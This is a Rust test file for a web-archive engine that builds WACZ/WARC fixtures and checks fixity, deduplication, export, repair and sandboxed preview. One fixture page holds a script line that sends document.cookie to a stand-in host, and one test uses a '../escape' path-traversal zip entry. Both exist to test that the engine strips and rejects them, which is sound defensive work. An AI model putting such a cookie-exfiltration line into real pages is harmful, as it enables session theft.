//! Risk basis: untrusted imports must not publish corrupt archives; derivatives
//! must not lose payloads, overwrite originals, or execute captured credentials.
use super::*;
use std::io::Write;
use zip::{write::SimpleFileOptions, CompressionMethod, ZipWriter};

fn write_zip(path: &Path, entries: Vec<(&str, Vec<u8>)>) {
    let mut zip = ZipWriter::new(std::fs::File::create(path).unwrap());
    for (name, data) in entries {
        zip.start_file(
            name,
            SimpleFileOptions::default().compression_method(CompressionMethod::Stored),
        )
        .unwrap();
        zip.write_all(&data).unwrap();
    }
    zip.finish().unwrap();
}
pub(super) fn fixture(path: &Path) {
    let payload=b"<!doctype html><html><head><title>Archive fixture</title></head><body><h1>Saved content</h1><div class=ad>Remove me</div><script>fetch('https://leak.invalid/cookie?'+document.cookie)</script><img src='/shared.png'><p>Readable words.</p></body></html>";
    let block=[format!("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\n\r\n",payload.len()).as_bytes(),payload].concat();
    let raw=[format!("WARC/1.1\r\nWARC-Type: response\r\nWARC-Target-URI: https://example.test/\r\nWARC-Date: 2026-01-02T03:04:05Z\r\nWARC-Record-ID: <urn:uuid:fixture>\r\nContent-Type: application/http; msgtype=response\r\nContent-Length: {}\r\n\r\n",block.len()).as_bytes(),&block,b"\r\n\r\n"].concat();
    let mut encoder = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
    encoder.write_all(&raw).unwrap();
    let warc = encoder.finish().unwrap();
    let index=format!("test,example)/ 20260102030405 {}\n",serde_json::json!({"url":"https://example.test/","filename":"capture.warc.gz","offset":0,"length":warc.len(),"status":"200","mime":"text/html"})).into_bytes();
    let pages=b"{\"format\":\"json-pages-1.0\",\"id\":\"pages\"}\n{\"url\":\"https://example.test/\",\"title\":\"Archive fixture\",\"ts\":\"2026-01-02T03:04:05Z\"}\n".to_vec();
    let entries = vec![
        ("archive/capture.warc.gz", warc),
        ("indexes/index.cdxj", index),
        ("pages/pages.jsonl", pages),
    ];
    let resources:Vec<_>=entries.iter().map(|(name,bytes)|serde_json::json!({"path":name,"name":name,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
    let manifest=serde_json::to_vec(&serde_json::json!({"profile":"data-package","wacz_version":"1.1.1","title":"Fixture","resources":resources})).unwrap();
    let mut entries = entries;
    entries.push(("datapackage.json", manifest));
    write_zip(path, entries);
}
#[test]
fn archive_engine_import_fixity_and_actual_inventory() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("fixture.wacz");
    fixture(&path);
    let report = inspect_archive(&path).unwrap();
    assert_eq!(report.resources.len(), 1);
    assert_eq!(report.pages.len(), 1);
    assert!(report.pages[0].text.contains("Saved content"));
    assert!(!report.pages[0].text.contains("document.cookie"));
    assert_eq!(
        report.archive_bytes,
        report.unique_payload_bytes + report.duplicate_payload_bytes + report.metadata_bytes
    );
    let verification = verify_archive(&path).unwrap();
    assert!(verification.valid);
    assert!(verification
        .checks
        .iter()
        .any(|c| c.name == "offline-browser-replay" && c.status == "not-run"));
}
#[test]
fn archive_engine_rejects_unsafe_member_and_corrupt_manifest() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("unsafe.wacz");
    write_zip(&path, vec![("../escape", vec![0])]);
    assert!(inspect_archive(&path).is_err());
    write_zip(
        &path,
        vec![
            ("archive/a.warc.gz", vec![1]),
            (
                "datapackage.json",
                br#"{"resources":[{"path":"archive/a.warc.gz","bytes":1,"hash":"sha256:wrong"}]}"#
                    .to_vec(),
            ),
        ],
    );
    assert!(inspect_archive(&path).unwrap_err().contains("SHA-256"));
}
#[test]
fn archive_engine_bounded_inflation() {
    assert!(read::bounded(&b"12345"[..], 4).is_err());
}

fn noise(size: usize) -> Vec<u8> {
    let mut seed = 0x1020304050607080u64;
    (0..size)
        .map(|_| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            seed as u8
        })
        .collect()
}
fn multi_fixture(path: &Path, entries: &[(&str, &str, &[u8])], date: &str) {
    let mut warc = vec![];
    let mut index = String::new();
    let mut pages = String::from("{\"format\":\"json-pages-1.0\",\"id\":\"pages\"}\n");
    for (i, (url, mime, payload)) in entries.iter().enumerate() {
        let block=[format!("HTTP/1.1 200 OK\r\nContent-Type: {mime}; charset=utf-8\r\nContent-Length: {}\r\n\r\n",payload.len()).as_bytes(),payload].concat();
        let raw=[format!("WARC/1.1\r\nWARC-Type: response\r\nWARC-Target-URI: {url}\r\nWARC-Date: {date}\r\nWARC-Record-ID: <urn:uuid:{}-{i}>\r\nContent-Type: application/http; msgtype=response\r\nContent-Length: {}\r\n\r\n",read::hash(date.as_bytes()),block.len()).as_bytes(),&block,b"\r\n\r\n"].concat();
        let offset = warc.len();
        let mut encoder = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
        encoder.write_all(&raw).unwrap();
        let bytes = encoder.finish().unwrap();
        warc.extend_from_slice(&bytes);
        index.push_str(&format!("test,example)/{i} {} {}\n",read::timestamp_of(date).unwrap(),serde_json::json!({"url":url,"filename":"capture.warc.gz","offset":offset.to_string(),"length":bytes.len().to_string(),"status":"200","mime":mime})));
        if *mime == "text/html" {
            pages.push_str(&format!(
                "{}\n",
                serde_json::json!({"url":url,"ts":date,"title":"Fixture"})
            ));
        }
    }
    let entries = vec![
        ("archive/capture.warc.gz", warc),
        ("indexes/index.cdxj", index.into_bytes()),
        ("pages/pages.jsonl", pages.into_bytes()),
    ];
    let resources:Vec<_>=entries.iter().map(|(name,bytes)|serde_json::json!({"path":name,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
    let manifest = serde_json::to_vec(
        &serde_json::json!({"wacz_version":"1.1.1","title":"Fixture","resources":resources}),
    )
    .unwrap();
    let mut entries = entries;
    entries.push(("datapackage.json", manifest));
    write_zip(path, entries);
}
#[test]
fn archive_engine_export_preserves_shared_payloads_and_source() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source.wacz");
    let output = dir.path().join("compact.wacz");
    let blob = noise(128 * 1024);
    multi_fixture(&source,&[("https://example.test/keep","text/html",b"<html><body><h1>Keep</h1><div class='ad'>Sensitive omitted text</div><img src='/shared.png'></body></html>"),("https://example.test/drop","text/html",b"<h1>Drop</h1><img src='/shared.png'>"),("https://example.test/shared.png","image/png",b"shared captured image"),("https://tracker.test/blob","application/octet-stream",&blob)],"2026-01-01T00:00:00Z");
    let original = inspect_archive(&source).unwrap();
    let options = ExportOptions {
        include_urls: vec!["https://example.test/keep".into()],
        exclude_domains: vec!["tracker.test".into()],
        remove_selectors: vec!["body > div.ad".into()],
        ..Default::default()
    };
    let report = export_archive(&source, &output, &options).unwrap();
    assert!(verify_archive(&output).unwrap().valid);
    assert_eq!(report.pages.len(), 1);
    assert!(!report.pages[0].text.contains("Sensitive omitted"));
    assert!(report
        .resources
        .iter()
        .any(|r| r.url.ends_with("shared.png")));
    assert_eq!(inspect_archive(&source).unwrap().sha256, original.sha256);
    assert!(original.archive_bytes > report.archive_bytes + 100_000);
    println!(
        "compact fixture: {} -> {} bytes ({} saved)",
        original.archive_bytes,
        report.archive_bytes,
        original.archive_bytes - report.archive_bytes
    );
    assert!(export_archive(&source, &source, &options).is_err());
    assert!(export_archive(&source, &output, &options).is_err());
    let mut unsupported = options;
    unsupported.remove_selectors = vec!["div:has(script)".into()];
    assert!(export_archive(&source, &dir.path().join("bad.wacz"), &unsupported).is_err());
}
#[test]
fn archive_engine_cross_capture_revisits_rehydrate_without_parent() {
    // Risk: dependency-backed views must not disclose unbound archive bytes or
    // silently lose revisited HTML, and must leave source custody untouched.
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("parent.wacz");
    let source = dir.path().join("source.wacz");
    let dedup = dir.path().join("dedup.wacz");
    let standalone = dir.path().join("standalone.wacz");
    let blob = noise(128 * 1024);
    multi_fixture(
        &parent,
        &[
            (
                "https://example.test/asset",
                "application/octet-stream",
                &blob,
            ),
            (
                "https://example.test/",
                "text/html",
                b"<h1>New content</h1>",
            ),
        ],
        "2026-01-01T00:00:00Z",
    );
    multi_fixture(
        &source,
        &[
            (
                "https://example.test/",
                "text/html",
                b"<h1>New content</h1>",
            ),
            (
                "https://example.test/asset",
                "application/octet-stream",
                &blob,
            ),
            (
                "https://example.test/new.css",
                "text/css",
                b"body {color:blue}",
            ),
        ],
        "2026-02-01T00:00:00Z",
    );
    let source_report = inspect_archive(&source).unwrap();
    let parent_report = inspect_archive(&parent).unwrap();
    let deps = vec![AuthorizedDependency {
        archive_id: "parent-id".into(),
        sha256: parent_report.sha256.clone(),
        authorized_local_path: parent.clone(),
    }];
    let report = deduplicate_archive(&source, &dedup, &deps).unwrap();
    assert_eq!(report.dependencies, vec!["parent-id"]);
    assert!(report.resources.iter().any(|r| r.url.ends_with("new.css")));
    assert!(!verify_archive(&dedup).unwrap().valid);
    assert!(report.archive_bytes + 100_000 < source_report.archive_bytes);
    let files_before = std::fs::read_dir(dir.path()).unwrap().count();
    assert!(preview_document(&dedup, "https://example.test/").is_err());
    assert!(reader_export(&dedup, "html").is_err());
    assert!(compare_archives(&source, &dedup).is_err());
    let mut denied = deps.clone();
    denied[0].archive_id = "unbound-id".into();
    assert!(preview_document_authorized(&dedup, "https://example.test/", &denied).is_err());
    assert!(reader_export_authorized(&dedup, "markdown", &denied).is_err());
    assert!(compare_archives_authorized(&source, &[], &dedup, &denied).is_err());
    denied = deps.clone();
    denied[0].sha256 = "0".repeat(64);
    assert!(preview_document_authorized(&dedup, "https://example.test/", &denied).is_err());
    assert!(reader_export_authorized(&dedup, "html", &denied).is_err());
    assert!(compare_archives_authorized(&dedup, &denied, &source, &[]).is_err());
    let preview = preview_document_authorized(&dedup, "https://example.test/", &deps).unwrap();
    assert!(preview.html.contains("New content"));
    assert!(reader_export_authorized(&dedup, "markdown", &deps)
        .unwrap()
        .contains("New content"));
    let comparison = compare_archives_authorized(&source, &[], &dedup, &deps).unwrap();
    assert!(comparison.changed_pages.is_empty());
    assert!(comparison.changed_resources.is_empty());
    assert_eq!(comparison.unchanged_pages, vec!["https://example.test/"]);
    assert_eq!(std::fs::read_dir(dir.path()).unwrap().count(), files_before);
    assert_eq!(
        inspect_archive(&source).unwrap().sha256,
        source_report.sha256
    );
    assert_eq!(inspect_archive(&dedup).unwrap().sha256, report.sha256);
    assert!(export_archive(&dedup, &standalone, &ExportOptions::default()).is_err());
    let output =
        materialize_archive(&dedup, &standalone, &deps, &ExportOptions::default()).unwrap();
    assert!(output.dependencies.is_empty());
    assert_eq!(
        output
            .resources
            .iter()
            .find(|r| r.url.ends_with("/asset"))
            .unwrap()
            .digest,
        source_report
            .resources
            .iter()
            .find(|r| r.url.ends_with("/asset"))
            .unwrap()
            .digest
    );
    std::fs::remove_file(&parent).unwrap();
    assert!(verify_archive(&standalone).unwrap().valid);
    println!(
        "cross-capture fixture: {} -> {} bytes ({} saved); standalone {}",
        source_report.archive_bytes,
        report.archive_bytes,
        source_report.archive_bytes - report.archive_bytes,
        output.archive_bytes
    );
    assert!(materialize_archive(
        &dedup,
        &dir.path().join("missing.wacz"),
        &deps,
        &ExportOptions::default()
    )
    .is_err());
}
#[test]
fn archive_engine_local_revisits_and_repair_do_not_drop_unrelated_pages() {
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("parent.wacz");
    let patch = dir.path().join("patch.wacz");
    let repaired = dir.path().join("repaired.wacz");
    let compact = dir.path().join("dedup.wacz");
    let standalone = dir.path().join("standalone.wacz");
    let blob = noise(64 * 1024);
    multi_fixture(
        &parent,
        &[
            ("https://example.test/one", "text/html", b"<h1>Old</h1>"),
            (
                "https://example.test/two",
                "text/html",
                b"<h1>Retained</h1>",
            ),
            ("https://example.test/a", "application/octet-stream", &blob),
            ("https://example.test/b", "application/octet-stream", &blob),
        ],
        "2026-01-01T00:00:00Z",
    );
    let report = export_archive(
        &parent,
        &compact,
        &ExportOptions {
            deduplicate: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert!(report.dependencies.is_empty());
    assert!(verify_archive(&compact).unwrap().valid);
    let expanded =
        materialize_archive(&compact, &standalone, &[], &ExportOptions::default()).unwrap();
    assert_eq!(expanded.resources.len(), 4);
    multi_fixture(
        &patch,
        &[
            (
                "https://example.test/one",
                "text/html",
                b"<h1>Repaired</h1>",
            ),
            ("https://example.test/new.css", "text/css", b"h1{color:red}"),
        ],
        "2026-03-01T00:00:00Z",
    );
    let report = compose_repair(
        &parent,
        &patch,
        &repaired,
        &[],
        &["https://example.test/one".into()],
    )
    .unwrap();
    assert_eq!(report.pages.len(), 2);
    assert!(report.pages.iter().any(|p| p.text.contains("Retained")));
    assert!(report
        .pages
        .iter()
        .any(|p| p.text.contains("Repaired") && p.ts.starts_with("2026-03")));
    assert!(report.resources.iter().any(|r| r.url.ends_with("new.css")));
    assert!(verify_archive(&repaired).unwrap().valid);
}
#[test]
fn archive_engine_preview_and_reader_do_not_execute_archive_script() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("fixture.wacz");
    fixture(&path);
    let preview = preview_document(&path, "https://example.test/").unwrap();
    assert!(!preview.html.contains("document.cookie"));
    assert!(!preview.html.contains("fetch("));
    assert!(preview
        .content_security_policy
        .contains("sandbox allow-scripts"));
    assert!(!preview
        .content_security_policy
        .contains("allow-same-origin"));
    assert!(preview.html.contains("web-archives:selection"));
    assert_eq!(preview.html.matches("<script").count(), 1);
    assert!(preview.html.contains("data-archive-selector"));
    let dom = content::dom(preview.html.as_bytes()).unwrap();
    let mut nodes = vec![dom.document.clone()];
    let mut meta_in_head = false;
    while let Some(node) = nodes.pop() {
        if node.element_name().as_deref() == Some("meta")
            && content::attr(&node, "http-equiv").as_deref() == Some("Content-Security-Policy")
        {
            meta_in_head = node.get_parent().and_then(|p| p.element_name()).as_deref()
                == Some("head")
                && content::attr(&node, "content").as_deref()
                    == Some(preview.content_security_policy.as_str());
        }
        nodes.extend(node.children.borrow().iter().cloned());
    }
    assert!(meta_in_head, "Trusted policy must survive DOM roundtrip");
    let html = reader_export(&path, "html").unwrap();
    assert!(!html.contains("<script"));
    assert!(html.contains("Saved content"));
    assert!(html.contains("2026-01-02"));
}

#[test]
#[ignore = "requires WEB_ARCHIVES_FIXTURE pointing to an actual bounded crawler capture"]
fn archive_engine_real_crawler_derivative_corruption_check() {
    let source = std::path::PathBuf::from(
        std::env::var("WEB_ARCHIVES_FIXTURE").expect("actual fixture path"),
    );
    let dir = tempfile::tempdir().unwrap();
    let destination = std::env::var_os("WEB_ARCHIVES_OUTPUT")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|| dir.path().join("derived.wacz"));
    let original = inspect_archive(&source).expect("actual crawler inspection");
    println!(
        "actual crawler input {} bytes, {} pages, {} resources, warnings {:?}",
        original.archive_bytes,
        original.pages.len(),
        original.resources.len(),
        original.warnings
    );
    let verification = verify_archive(&source).unwrap();
    assert!(verification.valid, "{verification:?}");
    let options = ExportOptions {
        remove_selectors: vec![".advert, .advertisement".into()],
        ..Default::default()
    };
    let report = export_archive(&source, &destination, &options).expect("actual crawler export");
    assert!(verify_archive(&destination).unwrap().valid);
    assert_eq!(inspect_archive(&source).unwrap().sha256, original.sha256);
    assert!(!report.pages.is_empty());
    assert_eq!(original.resources.len(), report.resources.len());
    assert!(!report
        .pages
        .iter()
        .any(|p| p.text.contains("Advertisement region")));
    println!(
        "actual crawler export {} -> {} bytes: {}",
        original.archive_bytes,
        report.archive_bytes,
        destination.display()
    );
    let preview = preview_document(&source, &original.pages[0].url).unwrap();
    assert_eq!(preview.html.matches("<script").count(), 1);
    assert!(reader_export(&source, "html").unwrap().contains("Capture:"));
}

#[test]
fn archive_engine_lazy_payload_rejects_source_mutation() {
    use std::io::{Read, Seek, SeekFrom};
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("source.wacz");
    fixture(&path);
    let archive = read::load(&path).unwrap();
    let source = archive.records[0].source.as_ref().unwrap();
    let offset = source.start + source.compressed_length / 2;
    let mut file = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(&path)
        .unwrap();
    file.seek(SeekFrom::Start(offset)).unwrap();
    let mut byte = [0];
    file.read_exact(&mut byte).unwrap();
    byte[0] ^= 0x7f;
    file.seek(SeekFrom::Start(offset)).unwrap();
    file.write_all(&byte).unwrap();
    file.sync_all().unwrap();
    assert!(archive.records[0]
        .eager_body_limited(read::MAX_RECORD)
        .is_err());
}

#[test]
fn archive_engine_thousands_of_revisits_materialize_without_payload_loss() {
    // Risk: common assets across thousands of pages must not produce a corrupt
    // derivative or hit an accidental quadratic resolver cutoff at publication.
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("many.wacz");
    let dedup = dir.path().join("dedup.wacz");
    let standalone = dir.path().join("standalone.wacz");
    let urls: Vec<_> = (0..3000)
        .map(|i| format!("https://example.test/assets/{i}"))
        .collect();
    let mut entries = vec![(
        "https://example.test/",
        "text/html",
        &b"<h1>Many resources</h1>"[..],
    )];
    entries.extend(urls.iter().map(|url| {
        (
            url.as_str(),
            "application/octet-stream",
            &b"Repeated captured asset payload"[..],
        )
    }));
    multi_fixture(&source, &entries, "2026-01-01T00:00:00Z");
    let report = export_archive(
        &source,
        &dedup,
        &ExportOptions {
            deduplicate: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(report.resources.len(), 3001);
    assert!(report.dependencies.is_empty());
    let report = materialize_archive(&dedup, &standalone, &[], &ExportOptions::default()).unwrap();
    assert_eq!(report.resources.len(), 3001);
    assert!(verify_archive(&standalone).unwrap().valid);
    let expected = format!("sha256:{}", read::hash(b"Repeated captured asset payload"));
    assert!(report
        .resources
        .iter()
        .filter(|r| r.mime == "application/octet-stream")
        .all(|r| r.digest == expected));
}

#[test]
fn archive_engine_compressed_index_rejects_truncated_or_missing_blocks() {
    // Risk: a manifest-valid archive with broken random-access index ranges
    // publishes successfully but loses offline access to its captured records.
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("fixture.wacz");
    fixture(&path);
    let mut zip = zip::ZipArchive::new(std::fs::File::open(&path).unwrap()).unwrap();
    let mut originals = vec![];
    for i in 0..zip.len() {
        let mut file = zip.by_index(i).unwrap();
        let name = file.name().to_owned();
        let mut bytes = vec![];
        std::io::Read::read_to_end(&mut file, &mut bytes).unwrap();
        if name != "datapackage.json" {
            originals.push((name, bytes));
        }
    }
    drop(zip);
    let cdx = originals
        .iter()
        .find(|(n, _)| n == "indexes/index.cdxj")
        .unwrap()
        .1
        .clone();
    let line = std::str::from_utf8(&cdx).unwrap().lines().next().unwrap();
    let prefix = line[..line.find('{').unwrap()].trim_end();
    let mut encoder = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
    encoder.write_all(&cdx).unwrap();
    let compressed = encoder.finish().unwrap();
    for (name, with_index, length) in [
        ("valid.wacz", true, compressed.len()),
        ("truncated.wacz", true, compressed.len() - 1),
        ("missing.wacz", false, compressed.len()),
    ] {
        let mut entries: Vec<_> = originals
            .iter()
            .filter(|(n, _)| n != "indexes/index.cdxj")
            .cloned()
            .collect();
        entries.push(("indexes/index.cdx.gz".into(), compressed.clone()));
        if with_index {
            entries.push(("indexes/index.idx".into(),format!("{prefix} {}\n",serde_json::json!({"filename":"index.cdx.gz","offset":0,"length":length,"digest":format!("sha256:{}",read::hash(&compressed))})).into_bytes()));
        }
        let resources:Vec<_>=entries.iter().map(|(path,bytes)|serde_json::json!({"path":path,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
        entries.push((
            "datapackage.json".into(),
            serde_json::to_vec(&serde_json::json!({"resources":resources})).unwrap(),
        ));
        let borrowed = entries
            .iter()
            .map(|(n, b)| (n.as_str(), b.clone()))
            .collect();
        let destination = dir.path().join(name);
        write_zip(&destination, borrowed);
        if name == "valid.wacz" {
            assert!(verify_archive(&destination).unwrap().valid);
        } else {
            assert!(inspect_archive(&destination).is_err());
        }
    }
    assert_eq!(
        read::normalize_sha256("sha256:6QAW7PDTIV5WD6ACG37BHQKHLPDISHGFSVMYV2T4XRIYWNSF4VQQ")
            .unwrap(),
        "sha256:f4016fbc73457b61f80236fe13c1475bc6891cc595598aea7cbc518b3645e561"
    );
}

#[test]
fn archive_engine_selector_dedupe_does_not_leave_removed_text_in_metadata() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source.wacz");
    let output = dir.path().join("derived.wacz");
    let html=&b"<html><body><h1>Retained story</h1><p class=secret>Removed confidential text</p></body></html>"[..];
    multi_fixture(
        &source,
        &[
            ("https://example.test/a", "text/html", html),
            ("https://example.test/b", "text/html", html),
        ],
        "2026-01-01T00:00:00Z",
    );
    let report = export_archive(
        &source,
        &output,
        &ExportOptions {
            deduplicate: true,
            remove_selectors: vec!["p.secret".into()],
            ..Default::default()
        },
    )
    .unwrap();
    assert!(report
        .pages
        .iter()
        .all(|p| p.text.contains("Retained story") && !p.text.contains("Removed confidential")));
    assert!(verify_archive(&output).unwrap().valid);
    let mut zip = zip::ZipArchive::new(std::fs::File::open(output).unwrap()).unwrap();
    let mut pages = String::new();
    std::io::Read::read_to_string(&mut zip.by_name("pages/pages.jsonl").unwrap(), &mut pages)
        .unwrap();
    assert!(!pages.contains("Removed confidential"));
}

#[test]
fn archive_engine_large_spa_html_preserves_original_and_crawler_baseline() {
    // Risk: optional text extraction must not prevent publication or silently
    // corrupt/drop a legal large SPA document and its archived dependencies.
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("large-spa.wacz");
    let output = dir.path().join("retained.wacz");
    let mut html = b"<html><body><h1>SPA shell</h1><script type=application/json>\"".to_vec();
    html.extend(std::iter::repeat_n(b'x', 3 * 1024 * 1024));
    html.extend_from_slice(b"\"</script><link rel=stylesheet href='/shared.css'></body></html>");
    multi_fixture(
        &source,
        &[
            ("https://example.test/spa", "text/html", &html),
            (
                "https://example.test/shared.css",
                "text/css",
                b"body{color:navy}",
            ),
        ],
        "2026-01-01T00:00:00Z",
    );
    let mut zip = zip::ZipArchive::new(std::fs::File::open(&source).unwrap()).unwrap();
    let mut entries = vec![];
    for i in 0..zip.len() {
        let mut file = zip.by_index(i).unwrap();
        let name = file.name().to_owned();
        let mut bytes = vec![];
        std::io::Read::read_to_end(&mut file, &mut bytes).unwrap();
        if name != "datapackage.json" {
            entries.push((name, bytes));
        }
    }
    drop(zip);
    let baseline = "Captured browser SPA baseline";
    entries.iter_mut().find(|(name,_)|name=="pages/pages.jsonl").unwrap().1=format!("{{\"format\":\"json-pages-1.0\",\"id\":\"pages\"}}\n{}\n",serde_json::json!({"url":"https://example.test/spa","title":"Browser title","ts":"2026-01-01T00:00:00Z","text":baseline})).into_bytes();
    let resources:Vec<_>=entries.iter().map(|(path,bytes)|serde_json::json!({"path":path,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
    entries.push((
        "datapackage.json".into(),
        serde_json::to_vec(&serde_json::json!({"resources":resources})).unwrap(),
    ));
    write_zip(
        &source,
        entries
            .iter()
            .map(|(n, b)| (n.as_str(), b.clone()))
            .collect(),
    );
    let report = inspect_archive(&source).unwrap();
    assert_eq!(report.pages[0].text, baseline);
    assert!(report
        .warnings
        .iter()
        .any(|w| w.contains("analysis omitted")));
    assert!(verify_archive(&source).unwrap().valid);
    let derived = export_archive(&source, &output, &ExportOptions::default()).unwrap();
    assert_eq!(derived.resources.len(), 2);
    assert_eq!(derived.resources[0].digest, report.resources[0].digest);
    assert_eq!(derived.pages[0].text, baseline);
    assert!(verify_archive(&output).unwrap().valid);
    assert!(reader_export(&source, "markdown")
        .unwrap()
        .contains(baseline));
    assert!(preview_document(&source, "https://example.test/spa").is_err());
    let unsupported = dir.path().join("unsupported.wacz");
    assert!(export_archive(
        &source,
        &unsupported,
        &ExportOptions {
            remove_selectors: vec![".ad".into()],
            ..Default::default()
        }
    )
    .is_err());
    assert!(!unsupported.exists());
}

#[test]
fn archive_engine_rendered_baseline_survives_subsecond_response_merge() {
    // Demonstrated profile-capture regression: JavaScript-rendered account text
    // was replaced with the pre-render response shell and an extra page row.
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("rendered.wacz");
    let output = dir.path().join("standalone.wacz");
    multi_fixture(&source,&[("https://example.test/account","text/html",b"<html><head><title>Shell title</title></head><body><div id=root>Response shell</div><script>document.querySelector('#root').textContent='Rendered account';</script></body></html>")],"2026-01-01T00:00:00Z");
    let mut zip = zip::ZipArchive::new(std::fs::File::open(&source).unwrap()).unwrap();
    let mut entries = vec![];
    for i in 0..zip.len() {
        let mut file = zip.by_index(i).unwrap();
        let name = file.name().to_owned();
        let mut bytes = vec![];
        std::io::Read::read_to_end(&mut file, &mut bytes).unwrap();
        if name != "datapackage.json" {
            entries.push((name, bytes));
        }
    }
    drop(zip);
    let baseline = "Rendered authenticated account details";
    let ts = "2026-01-01T00:00:00.500Z";
    entries.iter_mut().find(|(name,_)|name=="pages/pages.jsonl").unwrap().1=format!("{{\"format\":\"json-pages-1.0\",\"id\":\"pages\"}}\n{}\n",serde_json::json!({"id":"native-page-id","url":"https://example.test/account","title":"Rendered private dashboard","ts":ts,"text":baseline})).into_bytes();
    let resources:Vec<_>=entries.iter().map(|(path,bytes)|serde_json::json!({"path":path,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
    entries.push((
        "datapackage.json".into(),
        serde_json::to_vec(&serde_json::json!({"resources":resources})).unwrap(),
    ));
    write_zip(
        &source,
        entries
            .iter()
            .map(|(n, b)| (n.as_str(), b.clone()))
            .collect(),
    );
    for report in [
        inspect_archive(&source).unwrap(),
        export_archive(&source, &output, &ExportOptions::default()).unwrap(),
    ] {
        assert_eq!(report.pages.len(), 1);
        assert_eq!(report.pages[0].text, baseline);
        assert_eq!(report.pages[0].title, "Rendered private dashboard");
        assert_eq!(report.pages[0].ts, ts);
    }
    assert!(reader_export(&output, "markdown")
        .unwrap()
        .contains(baseline));
    assert!(verify_archive(&output).unwrap().valid);
}
